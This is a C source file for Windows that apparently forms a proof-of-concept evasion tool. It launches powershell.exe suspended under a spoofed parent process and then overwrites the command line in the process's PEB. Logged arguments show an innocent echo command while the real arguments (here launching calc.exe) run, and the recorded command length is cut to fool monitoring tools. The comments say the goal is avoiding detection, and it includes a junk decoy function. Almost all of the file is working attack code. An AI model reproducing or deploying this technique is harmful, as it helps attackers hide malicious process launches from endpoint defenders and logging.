#pragma once

#include "basic.h"
#include <strsafe.h>


// G4RbaG3 c0d3, 1gn0r3-7h1s 
BOOL MorphExe(IN LPWSTR faikArgs, IN LPWSTR RealArgs, OUT DWORD* dwProcessId, IN HANDLE hParentProcess, OUT HANDLE* hProcess, OUT HANDLE* hThread) { 
	NTSTATUS STATUS = NULL;
	PRTL_USER_PROCESS_PARAMETERS pParams = NULL;
	CHAR								envWindir[MAX_PATH];

	pNtQueryInformationProcess fnNtQueryInformationProcess = (pNtQueryInformationProcess)GetProcAddress(Modder(L"NTDLL", TRUE), "NtQueryInformationProcess");
	if (fnNtQueryInformationProcess == NULL) {
		warn("NtQueryInformationProcess Address unknown, won't be getting current dir  @---=0x%d", GetLastError());
		return FALSE;
	}
	if (!GetEnvironmentVariableA("WINDIR", envWindir, MAX_PATH)) {
		warn("Can't find WINDIR  @--0x%d", GetLastError());
		return FALSE;
	}
	info("WINDIR is supposed to be %s", envWindir);
	SIZE_T size = 0;
	for (; size < 0xFF; size++) {
		//sleep(0x2);
		SleepEx(0x2, TRUE);
		SleepEx(0x00000000001, FALSE);
	}
	return TRUE;
}


BOOL MorphExer(IN LPWSTR faikArgs, IN LPWSTR RealArgs, OUT DWORD* dwProcessId, IN HANDLE hParentProcess, OUT HANDLE* hProcess, OUT HANDLE* hThread) {

	NTSTATUS							STATUS = NULL;
	WCHAR								wProcess[MAX_PATH];
	STARTUPINFOEXW						exSiW = { 0 };
	PROCESS_INFORMATION					piProcInfo = { 0 };
	PROCESS_BASIC_INFORMATION			pbiProcBasicInfo = { 0 };
	ULONG								uRetLength = NULL;
	PPEB								pPEB = NULL;
	PRTL_USER_PROCESS_PARAMETERS		pParams = NULL;
	SIZE_T								szThreadAttribList = NULL,
										szReadWrite = NULL;
	DWORD								dwRealArgs = NULL;
	PPROC_THREAD_ATTRIBUTE_LIST			pProcThreadAttribList = NULL;


	RtlSecureZeroMemory(&exSiW, sizeof(STARTUPINFOEXW));
	RtlSecureZeroMemory(&piProcInfo, sizeof(PROCESS_INFORMATION));

	exSiW.StartupInfo.cb = sizeof(STARTUPINFOEXW);
	exSiW.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
	exSiW.StartupInfo.wShowWindow = SW_HIDE;


	pNtQueryInformationProcess fnNtQueryInformationProcess = (pNtQueryInformationProcess)GetProcAddress(Modder(L"NTDLL", TRUE), "NtQueryInformationProcess");
	if (fnNtQueryInformationProcess == NULL) {
		warn("NtQueryInformationProcess Address unknown,   @---=0x%d", GetLastError());
		return FALSE;
	}

	// -------------------------------------------------------------------
	// Ch4ng1ng P4r3nt Pr0c35s 7o 4noth3r pr0ces5

	InitializeProcThreadAttributeList(NULL, 1, NULL, &szThreadAttribList);
	DWORD eLast = GetLastError();
	if (eLast != ERROR_INSUFFICIENT_BUFFER) {
		warn("Initializing failed   @---=0x%d", eLast);
	}

	pProcThreadAttribList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, szThreadAttribList);
	if (pProcThreadAttribList == NULL) {
		warn("Unable to Allocate Heap   @---0x%d", GetLastError());
		return FALSE;
	}

	if (!InitializeProcThreadAttributeList(pProcThreadAttribList, 1, NULL, &szThreadAttribList)) {
		warn("Initializing ThreadAttribList failed   @---0x%d", GetLastError());
		return FALSE;
	}

	if (!UpdateProcThreadAttribute(pProcThreadAttribList, NULL, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParentProcess, sizeof(HANDLE), NULL, NULL)) {
		warn("Updating the Attributes failed   @---0x%d", GetLastError());
		return FALSE;
	} coolcmd("Updated OUR attributes to Parent Process");

	exSiW.lpAttributeList = pProcThreadAttribList;

	//--------------------------------------------------------------------/
	// sp00f1ng 4rgs 70 4vo1d d3t3cshn

	StringCchCopyW(wProcess, lstrlenW(faikArgs) * sizeof(WCHAR) +1, faikArgs);

	if (!CreateProcessW(NULL, wProcess, NULL, NULL, FALSE, (CREATE_SUSPENDED | CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT), NULL, L"C:\\Users\\Admin\\", &exSiW.StartupInfo, &piProcInfo)) {
		warn("Failed to Create Process   @---0x%d | @---0x%x",GetLastError(), GetLastError());
		return FALSE;
	}okay("Created a suspended process with PID @---== %d", piProcInfo.dwProcessId);

	if ((STATUS = fnNtQueryInformationProcess(piProcInfo.hProcess, ProcessBasicInformation, &pbiProcBasicInfo, sizeof(PROCESS_BASIC_INFORMATION), &uRetLength)) != 0) {
		warn("Query Info failed with   @---0x%0.8X", STATUS);
		return FALSE;
	}	coolcmd("PEB   @---0x%p", pbiProcBasicInfo.PebBaseAddress);

	pPEB = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PEB));
	if (!ReadProcessMemory(piProcInfo.hProcess, pbiProcBasicInfo.PebBaseAddress, (PVOID*)pPEB, sizeof(PEB), &szReadWrite) || szReadWrite != sizeof(PEB)) {
		warn("Read only %d of %d Bytes due to   @---0x%d", szReadWrite, sizeof(PEB), GetLastError());
		return FALSE;
	}
	okay("Read PEB");
	pParams = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(RTL_USER_PROCESS_PARAMETERS));
	szReadWrite = 0;
	if (!ReadProcessMemory(piProcInfo.hProcess, pPEB->ProcessParameters, (PVOID*)pParams, sizeof(RTL_USER_PROCESS_PARAMETERS), &szReadWrite) || szReadWrite != sizeof(RTL_USER_PROCESS_PARAMETERS)) {
		warn("Read only %d of %d Bytes due to   @---0x%d", szReadWrite, sizeof(RTL_USER_PROCESS_PARAMETERS), GetLastError());
		return FALSE;
	}
	okay("Read Process Parameters");

	dwRealArgs = (DWORD)lstrlenW(RealArgs) * sizeof(WCHAR) + 1;
	szReadWrite = 0;
	if (!WriteProcessMemory(piProcInfo.hProcess, (PVOID)pParams->CommandLine.Buffer, (PVOID)RealArgs, dwRealArgs, &szReadWrite) || szReadWrite != dwRealArgs) {
		warn("Wrote only %d of %d Bytes due to   @---0x%d", szReadWrite, dwRealArgs, GetLastError());
		return FALSE;
	}
	else {
		coolcmd("Spoofed Arguments successfully");
		// Ch4ng1ng "c""m"d" len to f00l m0ney7er1ng aPP5

		info("CommandLine.Length is @offset----0x%0.8X", offsetof(RTL_USER_PROCESS_PARAMETERS, CommandLine.Length)); // 0x70 in general
		
		DWORD dwCorrectLength = sizeof(L"powershell.exe");
		LPVOID lpCmdLength = (PBYTE)pPEB->ProcessParameters + offsetof(RTL_USER_PROCESS_PARAMETERS, CommandLine.Length);
		szReadWrite = 0;
		if (!WriteProcessMemory(piProcInfo.hProcess, lpCmdLength, &dwCorrectLength, sizeof(DWORD), &szReadWrite) || szReadWrite != sizeof(DWORD)) {
			warn("Wrote only %d of %d bytes, failed with   @---0x%d", szReadWrite, dwCorrectLength, GetLastError());
		}
		okay("Abus3d CmdLength further");
	}

	coolcmd("Press <Enter> to Resume the thread...");
	getchar();

	HeapFree(GetProcessHeap(), NULL, pPEB);
	HeapFree(GetProcessHeap, NULL, pParams);
	ResumeThread(piProcInfo.hThread);

	*dwProcessId = piProcInfo.dwProcessId;
	*hProcess = piProcInfo.hProcess;
	*hThread = piProcInfo.hThread;

	if (*dwProcessId != NULL && *hProcess != NULL && *hThread != NULL) return TRUE;
	return FALSE;
}

int main(int argc, char* argv[]) {

	if (argc < 2) {
		info("Usage : %s <PID>", argv[0]);
		exit(0);
	}

	HANDLE	hProcess = NULL,
		hThread = NULL,
		hParentProcess = NULL;

	DWORD	dwParentPID = NULL,
		dwPID = NULL;
	LPCSTR lpProcName = "powershell.exe";

	dwParentPID = atoi(argv[1]);	// note that there may be some process which you are not able to work this with
	hParentProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwParentPID);
	if (hParentProcess == NULL) {
		warn("Error Opening Parent Process   @---0x%d", GetLastError());
	}

	LPCWSTR faikArgs = L"powershell.exe -c echo 'Hello from my first Powershell command'";	// length should be greater than real arguments
	LPCWSTR RealArgs = L"powershell.exe -NoExit calc.exe";	//	length should always be smaller than arguments to be spoofed

	MorphExer((LPWSTR)faikArgs, (LPWSTR)RealArgs, &dwPID, hParentProcess, &hProcess, &hThread);
	return 0;
}
